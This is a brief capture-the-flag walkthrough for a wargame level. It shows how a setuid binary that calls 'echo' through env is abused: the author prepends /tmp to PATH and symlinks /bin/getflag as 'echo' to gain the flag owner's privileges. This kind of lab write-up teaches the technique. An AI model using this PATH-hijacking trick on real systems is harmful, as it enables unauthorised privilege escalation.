## Step 1
> ls ~

We saw an executable ``level03``.

## Step 2
> strings level03

We found in it ``/usr/bin/env echo Exploit me``.

## Step 3
> ls -l level03

The file is executed by the user flag03, even if we, as level03, do it.

## Step 4
We found out we can write in ``/tmp``.

> export PATH=/tmp:$PATH

> ln -s /bin/getflag echo

## Step 5
> ./level03

The flag has been printed directly.
